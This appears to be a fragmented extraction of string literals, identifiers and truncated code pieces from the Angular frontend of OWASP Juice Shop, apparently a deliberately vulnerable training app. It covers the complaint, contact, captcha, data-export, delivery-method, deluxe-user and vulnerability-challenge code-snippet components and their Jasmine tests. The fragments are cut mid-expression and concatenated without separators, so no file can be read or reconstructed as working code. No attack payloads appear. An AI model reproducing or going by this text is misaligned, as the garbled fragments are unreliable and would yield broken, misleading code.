... ce: anyconfigu ...  {} }))of({ ap ... : {} }){ appli ... s: {} }application: {}challenges: {}codeSni ... heck'])jasmine ... heck'])['get', 'check']codeSni ... of({}))codeSni ... rnValuecodeSni ... get.andcodeSni ... ice.getcodeFix ... heck'])codeFix ... of({}))codeFix ... rnValuecodeFix ... get.andcodeFixesService.getvulnLin ... heck'])['check']['conti ... FixIt']challen ... ndIt'))challen ... dIt.andchallen ... eFindItof('con ... indIt')challen ... ixIt'))challen ... xIt.andchallen ... deFixItof('con ... FixIt')[CodeSn ... ponent]{ provi ... e: {} }provide ... alogRefuseValue: {}{ provi ...  {} } }provide ... OG_DATAuseValu ... a: {} }{ dialogData: {} }dialogData: {}should log the error on retrieving configurationconfigu ... rror'))should set the retrieved snippetcodeSni ... et' }))of({ sn ... pet' }){ snipp ... ppet' }snippet: 'Snippet'Snippetexpect( ... pet' })expect( ... nippet)component.snippetit('Def ... )\r\n  })'Defaul ... solved'Default status and icons should reflect both challenge phases yet unsolvedexpect( ... toBe(0)expect( ... result)component.resultexpect( ... k).toBeexpect( ... t.lock)component.lockexpect( ... findIt)compone ... .findItcomponent.solved'should ...  phase'should set status and icons for solved "Find It" phasecompone ... tus = 1compone ... eStatuscomponent.dialogDatashould set an error on snippet retrieval as the snippetcodeSni ... or' })){ snippet: 'Error' }snippet: 'Error''should ... rieval'should set empty fixes on error during fixes retrievalcodeFix ... rror'))expect( ... .fixes)component.fixesit('sel ... )\r\n  })'select ... ponent'selected code lines are set in componentcompone ...  = [42]compone ... edLines[42]compone ...  3, 5])[1, 3, 5]expect( ...  3, 5])expect( ... dLines)selected code fix is set in componentcompone ... ix = 42compone ... ctedFixcomponent.setFix(1)component.setFixexpect( ... x).toBeexpect( ... tedFix)'select ... nation'selecting a code fix clears previous explanationcompone ... nswer!'compone ... anationWrong answer!expect( ... nation)it('loc ... )\r\n  })'lock i ... ilable'lock icon is red and "locked" when no fixes are availablecompone ...  = nullexpect( ... 'lock')expect( ... Icon())component.lockIcon()component.lockIconexpect( ... 'warn')expect( ... olor())compone ... Color()component.lockColor'lock i ... efault'lock icon is red and "locked" by defaultcompone ... 'Fix3']['Fix1' ... 'Fix3']Fix1Fix2Fix3component.lock = 0'lock i ... solved'lock icon is red and "locked" when "Find It" phase is unsolvedcomponent.lock = 2lock icon is green and "lock_open" when "Find It" phase is in solvedcomponent.lock = 1expect( ... _open')lock_openexpect( ... ccent')it('res ... )\r\n  })'result ... mitted'result icon is "send" when choice is not yet submittedcomponent.result = 0expect( ... 'send')compone ... tIcon()component.resultIconresult icon is red "clear" when wrong answer has been submittedcomponent.result = 2expect( ... clear')compone ... ltColorresult icon is green "check" when right answer has been submittedcomponent.result = 1expect( ... check')it('cor ... )\r\n  })'correc ...  phase'correctly submitted vulnerable lines toggle positive verdict for "Find It" phasecompone ... alue(0)component.tabvulnLin ... rue }))vulnLin ... rnValuevulnLin ... eck.andvulnLin ... e.checkof({ ve ... true }){ verdict: true }verdict: truecompone ... Lines()component.checkLinesxit('co ... \r\n  }))'correc ...  exist'correctly submitted vulnerable lines toggle tab to "Fix It" if code fixes existcomponent.tab.valuecorrectly submitted fix toggles positive verdict for "Fix It" phasecompone ... alue(1)compone ... x: 0 }]compone ... omFixes[{ fix: ... x: 0 }]{ fix:  ... ex: 0 }fix: 'Fix 1'Fix 1index: 0codeFix ... rue }))codeFix ... eck.andcodeFix ... e.checkcomponent.checkFix()component.checkFixexpect( ... .fixIt)compone ... d.fixIt'should ... ffling'should remember the original order of available code fix options when shufflingcompone ... Fix 3']['Fix 1 ... Fix 3']Fix 2Fix 3component.shuffle()component.shuffleexpect( ... x: 0 })expect( ... Containexpect( ... mFixes){ fix:  ... ex: 1 }fix: 'Fix 2'index: 1expect( ... x: 2 }){ fix:  ... ex: 2 }fix: 'Fix 3'index: 2P:/My Drive/Git/juice-shop/frontend/src/app/code-snippet/code-snippet.component.tsThemePaletteResultStateUndecidedRightWrong'code-snippet''./code-snippet.component.html''./code-snippet.component.scss'>=setVerdictswitchcasetype CodeSnippettype resulttype ThemePaletteenum Re ... ong,\r\n}findIt: booleanfixIt: booleanfix: stringindex: number@Compon ... ' }\r\n})Compone ... ' }\r\n}){\r\n  se ... t' }\r\n}selecto ... nippet'./code-snippet.component.html./code-snippet.component.scsshost: { ... ppet' }{ class ... ppet' }class:  ... nippet'public  ...  = nullstring []public  ... trol(0)new Unt ... trol(0)public  ... decidedResultS ... decidedpublic  ... false }{ findI ... false }findIt: falsefixIt: false@Inject ... G_DATA)Inject( ... G_DATA)config. ... Buttonsconfig.challengesthis.co ... ta.key)this.dialogData.keythis.dialogData(snippe ... \r\n    }this.sn ... snippetthis.snippetthis.so ... = falsethis.di ... us >= 1this.di ... eStatusthis.re ... e.Rightthis.resultResultState.Rightthis.lo ... e.Rightthis.lockthis.so ...  = truethis.sn ... error }{ snipp ... error }snippet: err.error(fixes) ... \r\n    }this.fi ... s.fixesthis.fixesfixes.fixesthis.shuffle()this.shufflethis.so ... us >= 2this.di ... us >= 2this.fixes = nulladdLine ... es\r\n  }(lines: ... es\r\n  }{\r\n     ... es\r\n  }this.se ... = linesthis.selectedLinessetFix  ... ll\r\n  }(fix: n ... ll\r\n  }this.se ... x = fixthis.selectedFixthis.ex ...  = nullthis.explanationchangeF ... ))\r\n  }this.se ... e, 10))this.setFixparseIn ... ue, 10)(event. ... ).value(event. ... lement)event.t ... Elementevent.targettoggleT ...  }\r\n  }(event: ...  }\r\n  }this.ta ... (event)this.tab.setValuethis.tabthis.re ... decidedif (eve ... \r\n    }event === 0if (thi ... e.Rightevent === 1checkFi ... })\r\n  }this.co ... .index)this.co ... e.checkthis.ra ... ].indexthis.ra ... tedFix]this.randomFixes(verdic ... \r\n    }this.se ... erdict)this.setVerdictverdict.verdictthis.ex ... anationverdict.explanationcheckLi ... })\r\n  }this.vu ... \n    })this.vu ... bscribethis.vu ... dLines)this.vu ... e.checkthis.vu ... Servicethis.hi ... ct.hintthis.hintverdict.hintlockIco ...  }\r\n  }this.fixes === nullreturn 'lock'switch  ... \r\n    }case Re ... k_open'return 'lock_open'case Re ...  'lock'ResultState.WronglockCol ...  }\r\n  }this.lockIcon()this.lockIconcase 'l ... accent'return 'accent'case 'l ...  'warn'return 'warn'shuffle ... ))\r\n  }this.ra ... dex }))this.fi ... dex }))this.fi ...    .mapthis.fi ... b.sort)this.fi ...   .sortthis.fi ... m() }))(fix, i ... om() })({ fix, ... om() }){ fix,  ... dom() }sort: Math.random()(a, b)  ...  b.sorta.sort - b.sorta.sortb.sort({ fix, ... ndex }){ fix, index }({ fix, index })setVerd ...  }\r\n  }(verdic ...  }\r\n  }if (thi ...  returnif (ver ... \r\n    }this.tab.value === 0this.tab.value(contin ...       }import( ...   .thenif (thi ... eTab(1)this.ta ... == nullthis.fixes !== nullthis.toggleTab(1)this.toggleTabthis.re ... e.WrongresultI ...  }\r\n  }case Re ... 'check'return 'check'case Re ... 'clear'return 'clear'default ...  'send'return 'send'resultC ...  }\r\n  }this.resultIcon()this.resultIconcase 'c ... accent'case 'c ...  'warn'@Inject ... ta: anyP:/My Drive/Git/juice-shop/frontend/src/app/complaint/complaint.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/complaint!messag ... l.dirtymessageControl.dirtyfileUploadError'mimeType'(fileUp ... eType')fileUpl ... meType'fileUploadError.name'fileSize'(fileUp ... eSize')fileUpl ... leSize'customerControl{{ 'WRITE_MESSAGE_PLACEHOLDER' | translate}}'WRITE_MESSAGE_PLACEHOLDER''WRITE_ ... anslate'WRITE_ ... HOLDER'WRITE_MESSAGE_PLACEHOLDERmessage ... equiredmessage ... invalidmessage ... .errorsuploadermessage ... adErrormessageControl.invalid || fileUploadErrorButton to send the complaintcomplaint-formmargin-top: 15px;{{complaintMessage.value?.length || 0}}complaintMessagecomplai ... th || 0complai ... .lengthcomplai ... e.valuemessageControl.invalid && messageControl?.errors.required{{"MANDATORY_MESSAGE" |
          translate}}"MANDATORY_MESSAGE""MANDAT ... anslateMANDATORY_MESSAGEText field for the mail address of the usererror fileUploadError(fileUploadError && fileUploadError.name == 'fileSize'){{
      "INVALID_FILE_SIZE" | translate: { size: '100 KB' } }}"INVALID_FILE_SIZE"'100 KB'"INVALI ... 0 KB' }INVALID_FILE_SIZE{ size: '100 KB' }size: '100 KB'100 KB(fileUploadError && fileUploadError.name == 'mimeType'){{
      "INVALID_FILE_TYPE" | translate: { type: 'PDF, ZIP' } }}"INVALID_FILE_TYPE"'PDF, ZIP'"INVALI ...  ZIP' }INVALID_FILE_TYPE{ type: 'PDF, ZIP' }type: 'PDF, ZIP'PDF, ZIP!(confirmation && !messageControl.dirty)P:/My Drive/Git/juice-shop/frontend/src/app/complaint/complaint.component.spec.ts'../Services/complaint.service'FileItem'./complaint.component'complaintService'whoAmI''should have customerControl as disabled''should be compulsory to provide a message''aa''should have a message of maximum 160 characters''should reset form by calling resetForm''should miss complaint object if retrieving currently logged in user fails'complaint'should hold the user email of the currently logged in user''x@x.xx'userEmail'should hold no email if current user is not logged in''should display support message with #id and reset complaint form on saving complaint''CUSTOMER_SUPPORT_COMPLAINT_REPLY''should begin uploading file if it has been added on saving''file.pdf''application/pdf''upload'../Services/complaint.service./complaint.componentlet com ... ce: anycomplai ... ce: anyuserSer ... oAmI'])jasmine ... oAmI'])['whoAmI']userSer ... AmI.anduserService.whoAmIcomplai ... save'])['save']complai ... of({}))complai ... rnValuecomplai ... ave.andcomplai ... ce.save[ComplaintComponent]'should ... sabled'should have customerControl as disabledexpect( ... sabled)compone ... isabledshould be compulsory to provide a messagecompone ... e('aa')aa'should ... acters'should have a message of maximum 160 charactersshould reset form by calling resetFormshould miss complaint object if retrieving currently logged in user failsexpect( ... plaint)component.complaint'should ... n user'should hold the user email of the currently logged in useruserSer ... xx' }))of({ em ... .xx' }){ email: 'x@x.xx' }email: 'x@x.xx'x@x.xxx@xxxexpect( ... @x.xx')expect( ... rEmail)component.userEmail'should ... ged in'should hold no email if current user is not logged in'should ... plaint'should display support message with #id and reset complaint form on saving complaintcomplai ...  42 }))of({ id: 42 }){ id: 42 }id: 42transla ... EPLY'))of('CUS ... REPLY')'CUSTOM ... _REPLY'CUSTOMER_SUPPORT_COMPLAINT_REPLYcompone ... ileItemcompone ... ueue[0]compone ... r.queuecomponent.uploadernull as ... ileItemexpect( ... : 42 }){ ref: 42 }ref: 42'should ... saving'should begin uploading file if it has been added on savingcompone ... }), {})new Fil ... }), {})new Fil ... pdf' })file.pdfpdf{ type: ... /pdf' }type: ' ... on/pdf'application/pdfspyOn(c ... pload')expect( ... upload)compone ... .uploadP:/My Drive/Git/juice-shop/frontend/src/app/complaint/complaint.component.ts For controlling the DOM Element for file input.// For  ...  input. For controlling error handling related to file input.ElementRefFileUploader'app-complaint''./complaint.component.html''./complaint.component.scss''fileControl'fileControl'/file-upload'authTokenallowedMimeType'application/xml''text/xml''application/zip''application/x-zip-compressed''multipart/x-zip'maxFileSize100000initComplaintonWhenAddingFileFailed`Error due to : ${onAfterAddingFileonSuccessItemsaveComplaint'complaint-form'nativeElementsavedComplaintcustomerSupportReplyselecto ... plaint'app-complaint'./comp ... t.html'./complaint.component.html['./com ... .scss']'./comp ... t.scss'./complaint.component.scsspublic  ...  }, [])new Unt ...  }, []){ value ...  true }value: ''disabled: truefileCon ... mentRefpublic  ... 0\r\n  })new Fil ... 0\r\n  }){\r\n     ... 00\r\n  }url: en ... upload'environ ... upload'/file-uploadauthTok ... ken')}`allowed ... x-zip']['appli ... x-zip']application/xmltext/xmlapplication/zip'applic ... ressed'application/x-zip-compressedmultipart/x-zipmaxFileSize: 100000this.initComplaint()this.initComplaintthis.up ... \r\n    }this.up ... eFailedthis.uploaderonWhenA ... eFailed(item,  ... \r\n    }this.fi ...  filterthis.fileUploadErrorthrow n ... name}`)new Err ... name}`)`Error  ... .name}`Error due to : filter.namethis.up ... ingFilethis.fi ... definedthis.up ... essItemthis.saveComplaint()this.saveComplaintthis.up ... Queue()this.up ... arQueueinitCom ... })\r\n  }this.complaint = {}this.complaintthis.co ... user.idthis.co ... .UserIdthis.us ... r.emailthis.userEmailthis.cu ... rEmail)this.cu ... etValuethis.customerControlthis.up ... ueue[0]this.uploader.queuethis.up ... pload()this.up ... .uploadthis.fi ...  = nullthis.fi ... t.valuethis.fi ... Elementthis.fileControlsaveCom ... r)\r\n  }{\r\n     ... r)\r\n  }this.co ... messagethis.co ...  error)this.co ... plaint)this.co ... ce.save(savedC ... \r\n    }this.tr ... t.id }){ ref:  ... nt.id }ref: sa ... aint.idsavedComplaint.id(custom ...       }this.co ... rtReplythis.co ... ationId(error) => errorresetFo ... ll\r\n  }this.me ... uched()this.me ... touchedthis.me ... stine()this.me ... ristineP:/My Drive/Git/juice-shop/frontend/src/app/contact/contact.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/contactuserIdControlauthorControlfeedbackControl{{ 'WRITE_REVIEW_PLACEHOLDER' | translate}}'WRITE_REVIEW_PLACEHOLDER'WRITE_REVIEW_PLACEHOLDERfeedbac ... equiredfeedbac ... invalidfeedbac ... .errorsformatRatingcaptchaControl{{ 'MANDATORY_CAPTCHA' | translate}}'MANDATORY_CAPTCHA'MANDATORY_CAPTCHAcaptcha ... equiredcaptcha ... invalidcaptcha ... .errorscaptcha ... patternauthorC ... !ratingauthorC ... invalid!ratingauthorControl.invalid || feedbackControl.invalid || captchaControl.invalid || !ratingButton to send the reviewfeedback-formcaptchaControl.invalid && captchaControl.errors.patterncaptchaControl.invalid && captchaControl.errors.requiredField for the result of the CAPTCHA code-?[\d]*margin-bottom: 10px; margin-top: 10px; font-size:small;captchaCAPTCHA code which must be solved{{captcha}}font-weight:500;rating-containermat-sliderfont-weight:500; margin-right: 8px; float:left;feedbackControl.invalid && feedbackControl.errors.required{{comment.value?.length || 0}}comment ... th || 0comment ... .lengthcomment.valueField with the name of the authorP:/My Drive/Git/juice-shop/frontend/src/app/contact/contact.component.spec.ts'../Services/captcha.service''./contact.component''ContactComponent'captchaService'getCaptcha''feedback''captcha''author''author formControl should be disabled''should be compulsory to provide feedback''feedback should not be more than 160 characters''should be compulsory to answer the captcha''should store the captcha and the captchaId on getting new captcha'captchaIdgetNewCaptcha'should hold the user id of the currently logged in user''should hold no user id if current user is not logged in''should miss feedback object if retrieving currently logged in user fails''should log the error if retrieving currently logged in user fails''should hold the anonymized email of the currently logged in user''xxxx@x.xx''***x@x.xx''should hold anonymous placeholder for email if current user is not logged in''anonymous''should populate the feedback object and send it via the feedback service on saving''2''feedback (anonymous)''should display thank-you message and reset feedback form on saving feedback''should display 5-star thank-you message and reset feedback form on saving 5-star feedback''should clear the form display error if saving feedback fails''resetCaptcha'resetCaptcha'should clear the feedback object if saving feedback fails'../Services/captcha.service./contact.component/contactlet cap ... ce: anycaptchaService: anyfeedbac ... save'])feedbac ... of({}))feedbac ... ave.andfeedbackService.savecaptcha ... tcha'])jasmine ... tcha'])['getCaptcha']captcha ... of({}))captcha ... rnValuecaptcha ... cha.andcaptcha ... Captcha[ContactComponent]compone ... dback')compone ... ptcha')compone ... uthor')it('aut ... )\r\n  })'author ... sabled'author formControl should be disabledshould be compulsory to provide feedbackit('fee ... )\r\n  })'feedba ... acters'feedback should not be more than 160 characters'should ... aptcha'should be compulsory to answer the captchacompone ... ue('1')should store the captcha and the captchaId on getting new captcha() => { ... 2)\r\n  }{\r\n     ... 2)\r\n  }captcha ... : 2 }))of({ ca ... d: 2 }){ captc ... Id: 2 }captcha: 'captcha'captchaId: 2compone ... ptcha()compone ... Captchaexpect( ... ptcha')expect( ... a).toBeexpect( ... aptcha)component.captchaexpect( ... tchaId)component.captchaIdshould hold the user id of the currently logged in useruserSer ...  42 }))expect( ... oBe(42)should hold no user id if current user is not logged inshould miss feedback object if retrieving currently logged in user failsexpect( ... edback)component.feedbackshould log the error if retrieving currently logged in user failsshould hold the anonymized email of the currently logged in user{ email ... x.xx' }email: 'xxxx@x.xx'xxxx@x.xxxxxx@x***x@x.xxshould hold anonymous placeholder for email if current user is not logged inuserSer ...  {} }))of({ user: {} }){ user: {} }user: {}expect( ... ymous')should populate the feedback object and send it via the feedback service on savingcompone ... aId = 2compone ... ue('2')component.rating = 5component.ratingexpect( ...  '2' })expect( ... e.save){ captc ... : '2' }captcha: '2'comment ... ymous)''feedba ... ymous)'feedback (anonymous)feedback (anonymous)rating: 5UserId: '2'should display thank-you message and reset feedback form on saving feedbackfeedbac ... : 4 }))of({ rating: 4 }){ rating: 4 }should display 5-star thank-you message and reset feedback form on saving 5-star feedbackfeedbac ... : 5 }))of({ rating: 5 }){ rating: 5 }should clear the form display error if saving feedback failsfeedbac ... or' }))spyOn(c ... ptcha')should clear the feedback object if saving feedback failsP:/My Drive/Git/juice-shop/frontend/src/app/contact/contact.component.tsfaPaperPlane'app-contact''./contact.component.html''./contact.component.scss''-?[\\d]*'`***${'feedback-form'} (${savedFeedback'FEEDBACK_FIVE_STAR_THANK_YOU'feedbackThankYou'FEEDBACK_THANK_YOU'}`library ... rPlane)selecto ... ontact'app-contact'./cont ... t.html'./contact.component.html['./con ... .scss']'./cont ... t.scss'./contact.component.scsspublic  ... d]*')])new Unt ... d]*')])[Valida ... \d]*')]Validat ... \\d]*')Validators.pattern-?[\d]*[\d]public  ... '', [])new Unt ... '', [])public captcha: anypublic  ... Id: any(data:  ... \r\n    }this.feedback = {}this.feedbackthis.us ... ata.id)this.us ... etValuethis.userIdControldata.idthis.fe ... data.idthis.feedback.UserIdthis.au ... ymous')this.au ... etValuethis.authorControldata.em ... nymous'data.email`***${d ... ce(3)}`***data.email.slice(3)data.email.slicethis.fe ... definedthis.getNewCaptcha()this.getNewCaptchagetNewC ... r)\r\n  }this.ca ... => err)this.ca ... bscribethis.ca ... ptcha()this.ca ... Captchathis.captchaServicethis.ca ... captchathis.captchadata.captchathis.ca ... ptchaIdthis.captchaIddata.captchaId(err) => errsave () ... })\r\n  }this.fe ... ptchaIdthis.fe ... l.valuethis.fe ... captchathis.ca ... l.valuethis.captchaControlthis.fe ... alue})`this.fe ... comment`${this ... alue})`this.feedbackControl (this.au ... l.valuethis.fe ... .ratingthis.feedback.ratingthis.ratingthis.us ... l.valuethis.fe ... edback)this.fe ... ce.save(savedF ... \r\n    }if (sav ...       }savedFe ... g === 5savedFeedback.ratingthis.tr ... K_YOU')'FEEDBA ... NK_YOU'FEEDBACK_FIVE_STAR_THANK_YOU(feedba ...       }this.sn ... ankYou)this.sn ... tionId)FEEDBACK_THANK_YOUthis.resetCaptcha()this.resetCaptchathis.au ... uched()this.au ... touchedthis.au ... stine()this.au ... ristinethis.au ... lue('')this.fe ... uched()this.fe ... touchedthis.fe ... stine()this.fe ... ristinethis.fe ... lue('')this.fe ... etValuethis.rating = 0this.ca ... uched()this.ca ... touchedthis.ca ... stine()this.ca ... ristinethis.ca ... lue('')this.ca ... etValueresetCa ... ')\r\n  }formatR ... \u2605`\r\n  }{\r\n     ... \u2605`\r\n  }return `${value}\u2605``${value}\u2605`\u2605P:/My Drive/Git/juice-shop/frontend/src/app/data-export/data-export.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/data-exportformatControlpresenceOfCaptcha{{ 'TYPE_THESE_LETTERS' | translate: {length: '5'} }}'TYPE_THESE_LETTERS''5''TYPE_T ... h: '5'}TYPE_THESE_LETTERS{length: '5'}length: '5'captcha ... nlengthformatC ... aptcha)formatC ... invalid(captch ... aptcha)formatControl.invalid || (captchaControl.invalid && presenceOfCaptcha)Button to send the request{{'BTN_REQUEST' | translate}}'BTN_REQUEST''BTN_RE ... anslateBTN_REQUESTdata-export-formmargin-top: 10px; width: 100%;captchaControl.invalid && captchaControl.errors.minlengthcaptchaControl.invalid && captchaControl.errors.required {{captchaInput.value?.length || 0}}captchaInputcaptcha ... th || 0captcha ... .lengthcaptchaInput.valuecaptcha-imagemargin-left: 10px;float: left; margin-top: 40px; font-weight: 500; margin-bottom: 20px;mat-radio-groupSelect an optionExport Option ExcelExport Option PDFExport Option JSONradio-label{{error}}P:/My Drive/Git/juice-shop/frontend/src/app/data-export/data-export.component.spec.ts'./data-export.component''../Services/image-captcha.service'SecurityContext'../Services/data-subject.service''DataExportComponent'imageCaptchaServicedataSubjectServicedomSanitizer'dataExport''should compile''should reinitizalise form by calling resetForm''should be compulsory to select export format''should be compulsory to answer the captcha when captcha is present''should store the captcha on getting new captcha''<svg>captcha</svg>'sanitezedCaptchasanitizeHTML'should show the confirmation and fetch user data and reset data export form on requesting data export''Data being exported'userData'{ user data }''should clear the form and display error if exporting data fails''resetFormError'resetFormError./data-export.component../Services/image-captcha.service../Services/data-subject.service'DataEx ... ponent'let ima ... ce: anyimageCa ... ce: anylet dat ... ce: anydataSub ... ce: anylet dom ... nitizerdomSani ... nitizerimageCa ... tcha'])imageCa ... of({}))imageCa ... rnValueimageCa ... cha.andimageCa ... CaptchadataSub ... port'])jasmine ... port'])['dataExport'][DataEx ... ponent]domSani ... itizer)TestBed ... itizer)should compileshould reinitizalise form by calling resetForm'should ... format'should be compulsory to select export format'should ... resent'should be compulsory to answer the captcha when captcha is presentcompone ... 12345')should store the captcha on getting new captchaimageCa ... g>' }))of({ im ... vg>' }){ image ... svg>' }image:  ... </svg>'<svg>captcha</svg>const s ... aptcha)sanitez ... aptcha)domSani ... aptcha)domSani ... anitizeSecurityContext.HTMLexpect( ... /svg>')'should ... export'should show the confirmation and fetch user data and reset data export form on requesting data exportdataSub ...  }' }))dataSub ... rnValuedataSub ... ort.anddataSub ... aExportof({ co ... a }' }){ confi ... ta }' }confirm ... ported''Data b ... ported'Data being exporteduserDat ... data }'{ user data }expect( ... orted')expect( ... ata }')component.userDatashould clear the form and display error if exporting data failsdataSub ... or' }))spyOn(c ... Error')expect( ... mError)compone ... rmErrorP:/My Drive/Git/juice-shop/frontend/src/app/data-export/data-export.component.ts'app-data-export''./data-export.component.html''./data-export.component.scss'dataRequestlastSuccessfulTryneedCaptchanowTimetimeOfCaptcha'lstdtxprt'300000'width=500'selecto ... export'app-data-export'./data ... t.html'./data-export.component.html['./dat ... .scss']'./data ... t.scss'./data-export.component.scsspublic  ... th(5)])new Unt ... th(5)])[Valida ... gth(5)]public  ... ry: anypublic userData: anyngOnIni ... {}\r\n  }{\r\n     ... {}\r\n  }this.needCaptcha()this.needCaptchathis.da ... st = {}this.dataRequestneedCap ...  }\r\n  }const n ...  Date()nowTime = new Date()const t ... Date(0)timeOfC ... Date(0)localSt ... Date(0)localSt ... txprt')lstdtxprtnew Dat ... rt'))))JSON.pa ... prt')))String( ... xprt'))new Date(0)if (now ... \r\n    }nowTime ...  300000nowTime ... tTime()nowTime.getTime()nowTime.getTimetimeOfC ... tTime()timeOfC ... getTimethis.pr ...  = truethis.pr ... CaptchagetNewC ... })\r\n  }this.im ... \n    })this.im ... bscribethis.im ... ptcha()this.im ... Captchathis.im ... Servicethis.ca ... .image)this.sa ... .image)data.imagethis.da ... l.valuethis.da ... .answerthis.da ... .formatthis.fo ... l.valuethis.formatControlthis.da ... \n    })this.da ... bscribethis.da ... equest)this.da ... aExportthis.da ... Servicethis.co ... rmationdata.confirmationthis.us ... serDatathis.userDatadata.userDatawindow. ... erData)window. ... t.writewindow. ... ocumentwindow. ... h=500')window.openwidth=500this.la ...  Date()this.la ... sfulTrylocalSt ... ulTry))JSON.st ... fulTry)this.er ... r.errorerror.errorthis.co ...  = nullthis.re ... Error()this.resetFormErrorthis.fo ... uched()this.fo ... touchedthis.fo ... stine()this.fo ... ristinethis.fo ... lue('')this.fo ... etValuepublic  ... nitizerP:/My Drive/Git/juice-shop/frontend/src/app/delivery-method/delivery-method.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/delivery-methodselectMethodselectM ... ent.id)element.icondeliver ... definedchooseDeliveryMethodchooseD ... ethod()btn nextButtonProceed to delivery method selectiondeliveryMethodId === undefinedchooseDeliveryMethod()btn btn-returnselection.toggle(row); selectMethod(element.id)ETA25%{{ element.eta }}element.eta{{"LABEL_DAYS" | translate}}"LABEL_DAYS""LABEL_ ... anslateLABEL_DAYSLABEL_EXPECTED_DELIVERY{{ element.price.toFixed(2) }}30%{{ element.name }}selectMethod(element.id)height: 12px;mat-dividerdetail-divideraddressCont{{address?.mobileNum}}address?.mobileNum{{address?.country}}address?.country{{address?.streetAddress}}{{address?.city}}address?.city{{address?.state}}address?.state{{address?.zipCode}}address?.zipCode{{address?.fullName}}address?.fullNameP:/My Drive/Git/juice-shop/frontend/src/app/delivery-method/delivery-method.component.spec.ts'rxjs/internal/observable/of''../Services/delivery.service''./delivery-method.component''../payment/payment.component''../payment-method/payment-method.component''DeliveryMethodComponent'deliveryService'payment/shop''should log errors from address service directly to browser console''should log errors from delivery service directly to browser console''should hold address on ngOnInit''should hold delivery methods on ngOnInit'methods'should store delivery method id on selectMethod''deliveryMethodId'import  ... ble/of''rxjs/i ... ble/of'rxjs/internal/observable/of../Services/delivery.service./delivery-method.component'../pay ... ponent'../payment/payment.component../payment-method/payment-method.component'Delive ... ponent'let add ... ce: anyaddressService: anylet del ... ce: anydeliveryService: anyaddress ... ById'])jasmine ... ById'])['getById']deliver ... 'get'])deliver ... of([]))deliver ... rnValuedeliver ... get.anddeliveryService.get[Delive ... ponent]path: 'payment/shop'payment/shopshould log errors from address service directly to browser consoleshould log errors from delivery service directly to browser consoledeliver ... rror'))'should ... OnInit'should hold address on ngOnInitaddress ... ss' }))of({ ad ... ess' }){ addre ... ress' }address: 'address'expect( ... ess' })expect( ... ddress)component.addressshould hold delivery methods on ngOnInitdeliver ... 1' }]))of([{ i ... '1' }])[{ id:  ...  '1' }]{ id: 1 ... : '1' }name: '1'price: 1eta: 1icon: '1'expect( ... [0].id)compone ... s[0].idcomponent.methods[0]component.methodsexpect( ... al('1')expect( ... ].name)compone ... 0].nameexpect( ... .price)compone ... ].priceexpect( ... 0].eta)compone ... [0].etaexpect( ... ].icon)compone ... 0].icon'should ... Method'should store delivery method id on selectMethodcompone ... thod(1)compone ... tMethodexpect( ... thodId)compone ... ethodIdcompone ... dId = 1compone ... ethod()compone ... yMethodexpect( ... ', '1')P:/My Drive/Git/juice-shop/frontend/src/app/delivery-method/delivery-method.component.tsfaRocketfaShippingFastfaTruck'app-delivery-method''./delivery-method.component.html''./delivery-method.component.scss''ETA'deliverySerivce'/payment''shop'library ... aTruck)selecto ... method''app-de ... method'app-delivery-method'./deli ... t.html'./delivery-method.component.html['./del ... .scss']'./deli ... t.scss'./delivery-method.component.scsspublic  ...  'ETA']['Selec ...  'ETA']public  ... ethod[]public address: anyconstru ... ne) { }this.ad ... ror) })this.ad ... ssId'))session ... essId')this.ad ... address(error) ... rror) }{ conso ... rror) }this.de ... ror) })this.de ... bscribethis.de ... e.get()this.de ... vce.getthis.deliverySerivce(method ... \r\n    }console.log(methods)this.me ... methodsthis.methodsthis.da ... ethods)new Mat ... ethods)selectM ...  }\r\n  }this.se ... ) || idthis.de ... Id = idthis.de ... ethodIdthis.de ... definedchooseD ... ))\r\n  }session ... ring())this.de ... tring()this.de ... oStringthis.ng ... hop']))async ( ... shop'])await t ... shop'])this.ro ... shop'])['/payment', 'shop']shopP:/My Drive/Git/juice-shop/frontend/src/app/deluxe-user/deluxe-user.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/deluxe-userlogoSrcappnameapplicationName{appnam ... onName}appname ... ionName!errorupgradeToDeluxe()main-wrapper33.33%60%item-descriptionitem-nameimg-containertransform: scale(3)img-responsive img-thumbnailmat-elevation-z6 deluxe-membershipAdd to Basketbtn-member{{ membershipCost }}membershipCost{appname: applicationName}viewBox0 0 720 720xmlnshttp://www.w3.org/2000/svgassets/public/images/deluxe/blankBoxes.png720heading mat-elevation-z6margin-top:5px;P:/My Drive/Git/juice-shop/frontend/src/app/deluxe-user/deluxe-user.component.spec.ts'./deluxe-user.component''../login/login.component''DeluxeUserComponent''deluxeStatus''upgradeToDeluxe''saveLastLoginIp''userService.isLoggedIn''next''should hold membership cost on ngOnInit''should set application name and logo as obtained from configuration''Logo''assets/public/images/Logo''should assemble internal logo location from image base path and URL obtained from configuration''http://test.com/logo.jpg''assets/public/images/logo.jpg''should log error on failure in retrieving configuration from backend'./deluxe-user.component/deluxe-user'../log ... ponent'../login/login.component'Deluxe ... ponent'let userService() => { ... n)\r\n  }userSer ... inIp'])jasmine ... inIp'])['delux ... ginIp']userSer ... tus.anduserSer ... eStatususerSer ... uxe.anduserSer ... oDeluxeuserSer ... next'])userSer ... oggedInjasmine ... next'])'userSe ... ggedIn'userService.isLoggedIn['next']userSer ... lue({})userSer ... ext.anduserSer ... In.nextuserSer ... nIp.anduserSer ... LoginIpcookieS ... move'])jasmine ... move'])['remove'][Deluxe ... ponent]TestBed ... cation)should hold membership cost on ngOnInituserSer ...  30 }))of({ me ... : 30 }){ membe ... t: 30 }membershipCost: 30expect( ... ual(30)expect( ... ipCost)compone ... hipCostshould set application name and logo as obtained from configurationof({ ap ... o' } }){ appli ... go' } }applica ... Logo' }{ name: ... Logo' }name: 'Name'logo: 'Logo'Logoexpect( ... 'Name')expect( ... onName)compone ... ionNameexpect( ... /Logo')expect( ... c).toBeexpect( ... ogoSrc)component.logoSrc'assets ... s/Logo'assets/public/images/Logoshould assemble internal logo location from image base path and URL obtained from configurationof({ ap ... g' } }){ appli ... pg' } }applica ... .jpg' }{ logo: ... .jpg' }logo: ' ... go.jpg''http:/ ... go.jpg'http://test.com/logo.jpghttp://testcom/logoexpect( ... o.jpg')'assets ... go.jpg'assets/public/images/logo.jpgassets/public/images/logo'should ... ackend'should log error on failure in retrieving configuration from backendP:/My Drive/Git/juice-shop/frontend/src/app/deluxe-user/deluxe-user.component.ts "Forgotten" test parameter to play with 